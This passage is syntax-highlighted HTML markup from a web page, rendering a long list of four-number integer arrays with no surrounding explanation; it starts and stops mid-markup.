punctuation">,</span> <span class="token number">57</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">88</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">84</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">68</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">59</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">92</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">83</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">109</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">87</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">92</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">73</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">126</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">55</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">71</span><span class="token punctuation">,</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">101</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">56</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">118</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">114</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">69</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">101</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">113</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">82</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">43</span><span class="token punctuation">,</span> <span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">23</span><span class="token punctuation">,</span> <span class="token number">43</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">47</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">,</span> <span class="token number">48</span><span class="token punctuation">,</span> <span class="token number">27</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">54</span><span class="token punctuation">,</span> <span class="token number">46</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">74</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">81</span><span class="token punctuation">,</span> <span class="token number">96</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">75</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">115</span><span class="token punctuation">,</span> <span class="token number">31</span><span class="token punctuation">,</span> <span class="token number">119</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">82</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">79</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">110</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">117</span><span class="token punctuation">,</span> <span class="token number">67</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">63</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">106</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">,</span> <span class="token number">122</span><span class="token punctuation">,</span> <span class="token number">107</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">114</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">56</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">66</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">86</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">84</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">65</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">85</span><span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">,</span> <span class="token number">90</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">70</span><span class="token punctuation">,</span> <span class="token number">99</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">117</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token 